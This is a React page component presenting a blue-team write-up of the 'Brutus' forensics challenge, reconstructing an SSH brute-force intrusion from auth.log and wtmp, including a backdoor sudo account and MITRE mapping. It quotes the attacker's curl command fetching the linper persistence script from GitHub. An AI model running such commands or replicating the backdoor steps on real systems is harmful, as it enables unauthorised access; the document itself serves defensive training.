import { useEffect } from "react";
import { ArrowLeft, Shield, Clock, User, Terminal, Lock, FileText } from "lucide-react";
import { Link } from "react-router-dom";
import CyberNavigation from "@/components/cyber/CyberNavigation";
import CyberFooter from "@/components/cyber/CyberFooter";
import { Badge } from "@/components/ui/badge";

const SherlockBrutus = () => {
  useEffect(() => {
    window.scrollTo(0, 0);
  }, []);

  return (
    <div className="min-h-screen bg-background">
      <CyberNavigation />

      <main className="pt-28 pb-16">
        <div className="container mx-auto px-6 max-w-5xl">
          <Link
            to="/cybersecurity"
            onClick={() => window.scrollTo(0, 0)}
            className="inline-flex items-center gap-2 text-muted-foreground hover:text-cyber transition-colors mb-8"
          >
            <ArrowLeft className="w-4 h-4" />
            <span className="text-sm font-body">Back to Cybersecurity</span>
          </Link>

          {/* Header */}
          <header className="mb-12">
            <div className="flex items-center gap-3 mb-4">
               <img src="/writeups/brutus/brutus_icon.png" alt="Brutus Icon" className="w-20 h-20 object-contain" />
            <h1 className="font-display text-4xl md:text-5xl font-semibold mb-4 text-gradient-cyber">
              Brutus
            </h1>
            </div>

            <p className="text-muted-foreground text-lg mb-6">
              Sherlock machine: Authentication Log Analysis & Incident Reconstruction
            </p>
            <div className="flex flex-wrap gap-2">
              {["Forensics", "Linux Logs", "Brute Force", "SSH", "MITRE ATT&CK", "Very Easy"].map((tag) => (
                <Badge key={tag} variant="outline" className="border-cyber/30 text-cyber">
                  {tag}
                </Badge>
              ))}
            </div>
          </header>

          {/* Overview Section */}
          <section className="mb-16">
            <h2 className="font-display text-3xl font-semibold mb-6 flex items-center gap-3">
              <FileText className="w-7 h-7 text-cyber" />
              Overview
            </h2>
            <div className="prose prose-invert max-w-none">
              <p className="text-foreground/90 leading-relaxed">
                Sherlock "Brutus" is a beginner-oriented forensic challenge focused on analyzing authentication logs and system artifacts to reconstruct an attacker's activity after a successful brute force attack.
              </p>
              <p className="text-foreground/90 leading-relaxed">
                The objective is to identify the attacker's IP address, determine the compromised account, reconstruct the timeline of events, detect persistence mechanisms, and map the attacker's actions to the MITRE ATT&CK framework.
              </p>
            </div>
          </section>

          {/* Section 1: Attacker IP */}
          <section className="mb-16">
            <h2 className="font-display text-3xl font-semibold mb-6 flex items-center gap-3">
              <Lock className="w-7 h-7 text-cyber" />
              <span className="text-cyber/60 font-mono text-2xl mr-2">01.</span>
              Identifying the Attacker's IP Address
            </h2>
            <div className="prose prose-invert max-w-none mb-8">
              <p className="text-foreground/90 leading-relaxed">
                By analyzing the <code className="text-cyber bg-cyber/10 px-2 py-1 rounded">auth.log</code> file, multiple failed authentication attempts can be observed originating from the same IP address. The repeated "Failed password" entries clearly indicate a brute force attack.
              </p>
              <p className="text-foreground/90 leading-relaxed">
                Eventually, the log shows a successful authentication entry. The IP address responsible for the attack is:
              </p>
              <div className="bg-muted/50 border border-cyber/20 rounded-lg p-4 font-mono text-cyber text-center text-xl font-semibold my-4">
                65.2.161.68
              </div>
              <p className="text-foreground/90 leading-relaxed">
                This confirms that the attacker successfully guessed valid credentials after numerous failed attempts.
              </p>
            </div>

            {/* Image */}
            <div className="rounded-xl overflow-hidden border border-border">
              <img src="/writeups/brutus/brute_force.png" alt="Auth.log showing brute force attempts" className="w-full h-auto" />
            </div>
          </section>

          {/* Section 2: Compromised Account */}
          <section className="mb-16">
            <h2 className="font-display text-3xl font-semibold mb-6 flex items-center gap-3">
              <User className="w-7 h-7 text-cyber" />
              <span className="text-cyber/60 font-mono text-2xl mr-2">02.</span>
              Compromised Account
            </h2>
            <div className="prose prose-invert max-w-none">
              <p className="text-foreground/90 leading-relaxed">
                Immediately after the successful authentication entry, the log shows that the compromised account was:
              </p>
              <div className="bg-muted/50 border border-cyber/20 rounded-lg p-4 font-mono text-cyber text-center text-xl font-semibold my-4">
                root
              </div>
              <p className="text-foreground/90 leading-relaxed">
                This represents a critical security breach, as the root account provides full administrative privileges over the system.
              </p>
            </div>
          </section>

          {/* Section 3: Login Timestamp */}
          <section className="mb-16">
            <h2 className="font-display text-3xl font-semibold mb-6 flex items-center gap-3">
              <Clock className="w-7 h-7 text-cyber" />
              <span className="text-cyber/60 font-mono text-2xl mr-2">03.</span>
              Identifying the Manual Login Timestamp (UTC)
            </h2>
            <div className="prose prose-invert max-w-none mb-8">
              <p className="text-foreground/90 leading-relaxed">
                Authentication success and session establishment are not always equivalent. To determine the exact login session used by the attacker, the <code className="text-cyber bg-cyber/10 px-2 py-1 rounded">wtmp</code> artifact must be analyzed.
              </p>
              <p className="text-foreground/90 leading-relaxed">
                The provided Python script was used to parse the file:
              </p>
              <div className="bg-muted/50 border border-border rounded-lg p-4 font-mono text-sm my-4">
                python3 utmp.py wtmp
              </div>
              <p className="text-foreground/90 leading-relaxed">
                This script extracts login session information from the wtmp file. The parsed output shows a login from IP <code className="text-cyber bg-cyber/10 px-2 py-1 rounded">65.2.161.68</code> associated with user ROOT. The timestamp must be reported in UTC. Since the working environment was in UTC+1 (Spain), one hour was subtracted from the recorded time.
              </p>
              <div className="bg-muted/50 border border-cyber/20 rounded-lg p-4 font-mono text-cyber text-center text-xl font-semibold my-4">
                2024-03-06 06:32:45 (UTC)
              </div>
              <p className="text-foreground/90 leading-relaxed">
                Correct time normalization is essential in forensic investigations to ensure timeline accuracy.
              </p>
            </div>

            {/* Image */}
            <div className="rounded-xl overflow-hidden border border-border">
              <img src="/writeups/brutus/wtmp_artifact.png" alt="Parsed wtmp output showing login session" className="w-full h-auto" />
            </div>
            
          </section>

          {/* Section 4: SSH Session Analysis */}
          <section className="mb-16">
            <h2 className="font-display text-3xl font-semibold mb-6 flex items-center gap-3">
              <Terminal className="w-7 h-7 text-cyber" />
              <span className="text-cyber/60 font-mono text-2xl mr-2">04.</span>
              SSH Session Number Analysis
            </h2>
            <div className="prose prose-invert max-w-none mb-8">
              <p className="text-foreground/90 leading-relaxed">
                SSH sessions are assigned unique identifiers upon login. While reviewing the logs, the following entry appears:
              </p>
              <div className="bg-muted/50 border border-border rounded-lg p-4 font-mono text-sm my-4">
                New session 34 of user root
              </div>
              <p className="text-foreground/90 leading-relaxed">
                However, session 34 is immediately closed within the same second:
              </p>
              <div className="bg-muted/50 border border-border rounded-lg p-4 font-mono text-sm my-4">
                Session 34 logged out<br />
                Removed session 34
              </div>
              <p className="text-foreground/90 leading-relaxed">
                Although session 34 corresponds to a successful authentication, it is terminated instantly and does not generate any subsequent activity. Short-lived sessions like this are often associated with automated brute force tools that validate credentials but do not establish an interactive shell.
              </p>
              <p className="text-foreground/90 leading-relaxed">
                Further down in the logs, another successful login appears:
              </p>
              <div className="bg-muted/50 border border-border rounded-lg p-4 font-mono text-sm my-4">
                New session 37 of user root
              </div>
              <p className="text-foreground/90 leading-relaxed">
                Unlike session 34, session 37 correlates with the beginning of malicious activity, including user creation and privilege modifications. Therefore, the session actually used by the attacker to perform actions on the system is:
              </p>
              <div className="bg-muted/50 border border-cyber/20 rounded-lg p-4 font-mono text-cyber text-center text-xl font-semibold my-4">
                Session 37
              </div>
              <p className="text-foreground/90 leading-relaxed">
                This highlights an important forensic principle: not every successful authentication corresponds to an operational attacker session. Contextual correlation with subsequent activity is necessary to determine the relevant session.
              </p>
            </div>

            {/* Log Evidence */}
            <div className="bg-muted/50 border border-border rounded-lg p-6 font-mono text-xs overflow-x-auto">
              <div className="space-y-1 text-foreground/80">
                <p>Mar  6 06:31:40 ip-172-31-35-28 sshd[2411]: Accepted password for root from 65.2.161.68 port 34782 ssh2</p>
                <p>Mar  6 06:31:40 ip-172-31-35-28 sshd[2411]: pam_unix(sshd:session): session opened for user root(uid=0) by (uid=0)</p>
                <p className="text-green-400 font-semibold">Mar  6 06:31:40 ip-172-31-35-28 systemd-logind[411]: New session 34 of user root.</p>
                <p className="text-red-400 font-semibold">Mar  6 06:31:40 ip-172-31-35-28 sshd[2379]: Received disconnect from 65.2.161.68 port 46698:11: Bye Bye [preauth]</p>
                <p className="text-muted-foreground my-2">. . .</p>
                <p>Mar  6 06:32:44 ip-172-31-35-28 sshd[2491]: Accepted password for root from 65.2.161.68 port 53184 ssh2</p>
                <p>Mar  6 06:32:44 ip-172-31-35-28 sshd[2491]: pam_unix(sshd:session): session opened for user root(uid=0) by (uid=0)</p>
                <p className="text-green-400 font-semibold">Mar  6 06:32:44 ip-172-31-35-28 systemd-logind[411]: New session 37 of user root.</p>
                <p className="text-muted-foreground my-2">. . .</p>
                <p>Mar  6 06:34:18 ip-172-31-35-28 groupadd[2586]: group added to /etc/group: name=cyberjunkie, GID=1002</p>
                <p>Mar  6 06:34:18 ip-172-31-35-28 groupadd[2586]: group added to /etc/gshadow: name=cyberjunkie</p>
                <p>Mar  6 06:34:18 ip-172-31-35-28 groupadd[2586]: new group: name=cyberjunkie, GID=1002</p>
                <p>Mar  6 06:34:18 ip-172-31-35-28 useradd[2592]: new user: name=cyberjunkie, UID=1002, GID=1002, home=/home/cyberjunkie, shell=/bin/bash, from=/dev/pts/1</p>
                <p>Mar  6 06:34:26 ip-172-31-35-28 passwd[2603]: pam_unix(passwd:chauthtok): password changed for cyberjunkie</p>
                <p>Mar  6 06:34:31 ip-172-31-35-28 chfn[2605]: changed user 'cyberjunkie' information</p>
              </div>
            </div>
          </section>

          {/* Section 5: Persistence Mechanism */}
          <section className="mb-16">
            <h2 className="font-display text-3xl font-semibold mb-6 flex items-center gap-3">
              <User className="w-7 h-7 text-cyber" />
              <span className="text-cyber/60 font-mono text-2xl mr-2">05.</span>
              Persistence Mechanism — New User Creation
            </h2>
            <div className="prose prose-invert max-w-none mb-8">
              <p className="text-foreground/90 leading-relaxed">
                After gaining interactive access, the attacker created a new user account:
              </p>
              <div className="bg-muted/50 border border-cyber/20 rounded-lg p-4 font-mono text-cyber text-center text-xl font-semibold my-4">
                cyberjunkie
              </div>
              <p className="text-foreground/90 leading-relaxed">
                The account was added to the <code className="text-cyber bg-cyber/10 px-2 py-1 rounded">sudo</code> group, granting elevated privileges.
              </p>
              <p className="text-foreground/90 leading-relaxed">
                This is a classic persistence technique. Even if the root password were changed, the attacker would retain privileged access through this secondary account.
              </p>
            </div>

            {/* Log Evidence */}
            <div className="bg-muted/50 border border-border rounded-lg p-6 font-mono text-xs overflow-x-auto">
              <div className="space-y-1 text-foreground/80">
                <p className="text-cyber font-semibold">Mar  6 06:35:15 ip-172-31-35-28 usermod[2628]: add 'cyberjunkie' to group 'sudo'</p>
                <p className="text-cyber font-semibold">Mar  6 06:35:15 ip-172-31-35-28 usermod[2628]: add 'cyberjunkie' to shadow group 'sudo'</p>
              </div>
            </div>
          </section>

          {/* Section 6: MITRE ATT&CK */}
          <section className="mb-16">
            <h2 className="font-display text-3xl font-semibold mb-6 flex items-center gap-3">
              <Shield className="w-7 h-7 text-cyber" />
              <span className="text-cyber/60 font-mono text-2xl mr-2">06.</span>
              MITRE ATT&CK Mapping
            </h2>
            <div className="prose prose-invert max-w-none">
              <p className="text-foreground/90 leading-relaxed">
                The persistence technique used by the attacker corresponds to:
              </p>
              <div className="bg-gradient-to-r from-cyber/10 to-cyber/5 border border-cyber/30 rounded-lg p-6 my-4">
                <p className="font-mono text-cyber text-lg font-semibold mb-2">
                  T1136.001 — Create Local Account
                </p>
              </div>
              <p className="text-foreground/90 leading-relaxed">
                Mapping attacker behavior to MITRE ATT&CK provides structured threat classification aligned with industry standards.
              </p>
            </div>
          </section>

          {/* Section 7: Session End */}
          <section className="mb-16">
            <h2 className="font-display text-3xl font-semibold mb-6 flex items-center gap-3">
              <Clock className="w-7 h-7 text-cyber" />
              <span className="text-cyber/60 font-mono text-2xl mr-2">07.</span>
              End of First Interactive SSH Session
            </h2>
            <div className="prose prose-invert max-w-none">
              <p className="text-foreground/90 leading-relaxed">
                By reviewing logout entries in <code className="text-cyber bg-cyber/10 px-2 py-1 rounded">auth.log</code>, the attacker's first interactive session ended at:
              </p>
              <div className="bg-muted/50 border border-cyber/20 rounded-lg p-4 font-mono text-cyber text-center text-xl font-semibold my-4">
                2024-03-06 06:37:24
              </div>
              <p className="text-foreground/90 leading-relaxed">
                This allows reconstruction of the attack duration and helps establish an accurate timeline of events.
              </p>
            </div>
          </section>

          {/* Section 8: Privileged Command */}
          <section className="mb-16">
            <h2 className="font-display text-3xl font-semibold mb-6 flex items-center gap-3">
              <Terminal className="w-7 h-7 text-cyber" />
              <span className="text-cyber/60 font-mono text-2xl mr-2">08.</span>
              Privileged Command Execution
            </h2>
            <div className="prose prose-invert max-w-none mb-8">
              <p className="text-foreground/90 leading-relaxed">
                After logging into the newly created backdoor account, the attacker leveraged sudo privileges to download a script from an external source.
              </p>
              <p className="text-foreground/90 leading-relaxed">
                The full command executed was:
              </p>
              <div className="bg-muted/50 border border-border rounded-lg p-4 font-mono text-sm my-4 overflow-x-auto">
                /usr/bin/curl https://raw.githubusercontent.com/montysecurity/linper/main/linper.sh
              </div>
              <p className="text-foreground/90 leading-relaxed">
                This confirms post-compromise activity involving external resource retrieval using elevated privileges, likely for enumeration or further exploitation.
              </p>
            </div>
          </section>

          {/* Conclusion */}
          <section className="mb-16">
            <h2 className="font-display text-3xl font-semibold mb-6 flex items-center gap-3">
              <Shield className="w-7 h-7 text-cyber" />
              Conclusion
            </h2>
            <div className="prose prose-invert max-w-none">
              <p className="text-foreground/90 leading-relaxed">
                Sherlock "Brutus" is a beginner-friendly forensic challenge focused on authentication log analysis and attack reconstruction.
              </p>
              <p className="text-foreground/90 leading-relaxed">
                Despite its introductory level, it reinforces essential defensive skills:
              </p>
              <ul className="list-disc pl-6 space-y-2 text-foreground/90">
                <li>Identifying brute force attack patterns</li>
                <li>Correlating authentication logs with session artifacts</li>
                <li>Distinguishing automated login validation from interactive attacker sessions</li>
                <li>Detecting persistence mechanisms</li>
                <li>Mapping attacker behavior to MITRE ATT&CK</li>
              </ul>
              <p className="text-foreground/90 leading-relaxed mt-6">
                This challenge serves as a solid foundation for developing blue team and incident response competencies.
              </p>
            </div>
          </section>

        </div>
      </main>

      <CyberFooter />
    </div>
  );
};

export default SherlockBrutus;
